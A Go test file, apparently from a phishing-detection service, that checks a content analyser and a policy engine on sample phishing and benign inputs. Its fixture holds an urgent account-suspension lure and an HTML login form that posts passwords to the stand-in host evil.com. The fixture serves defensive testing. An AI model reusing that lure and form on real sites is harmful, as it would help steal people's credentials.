package analysis_test

import (
	"context"
	"testing"

	"github.com/PhishVault/PhishVault-2/services/analysis/ai"
	"github.com/PhishVault/PhishVault-2/services/analysis/decision"
)

func TestTextPipeline(t *testing.T) {
	text := "Your account will be suspended within 24 hours. Action Required Immediately! Login to unlock."
	html := `<html><body><form action="http://evil.com/login" method="post"><input type="password" name="pass"></form></body></html>`

	// Simulate scanning "example.com"
	result := ai.AnalyzeContent(html, text, "example.com")

	if result.UrgencyScore < 0.5 {
		t.Errorf("Expected high urgency, got %f", result.UrgencyScore)
	}
	if result.Intent != "CredentialHarvesting" {
		t.Errorf("Expected Intent: CredentialHarvesting, got %s", result.Intent)
	}
	if !result.FormRisk.HasPassword {
		t.Error("Failed to detect password field")
	}
	if !result.FormRisk.ForeignAction {
		t.Error("Failed to detect foreign form action")
	}

	t.Logf("Pipeline Result: Intent=%s, Score=%f, FormRisk=%+v", result.Intent, result.UrgencyScore, result.FormRisk)
}

func TestOPA(t *testing.T) {
	// Malicious input
	input := decision.PolicyInput{
		VisualMatchScore: 0.9,
		UrgencyScore:     0.8,
		Intent:           "CredentialHarvesting",
		HasLoginForm:     true,
		DomainAgeDays:    5,
	}

	result, err := decision.EvaluateVerdict(context.Background(), input)
	if err != nil {
		t.Fatalf("OPA Eval failed: %v", err)
	}

	if result.Verdict != "MALICIOUS" {
		t.Errorf("Expected MALICIOUS, got %s (Score: %f)", result.Verdict, result.RiskScore)
	}
	t.Logf("OPA Result: Verdict=%s, Risk=%f", result.Verdict, result.RiskScore)

	// Safe input
	safeInput := decision.PolicyInput{
		VisualMatchScore: 0.1,
		UrgencyScore:     0.0,
		Intent:           "Benign",
		HasLoginForm:     false,
		DomainAgeDays:    100,
	}
	safeResult, err := decision.EvaluateVerdict(context.Background(), safeInput)
	if err != nil {
		t.Fatalf("OPA Eval failed: %v", err)
	}
	if safeResult.Verdict != "SAFE" {
		t.Errorf("Expected SAFE, got %s", safeResult.Verdict)
	}
}
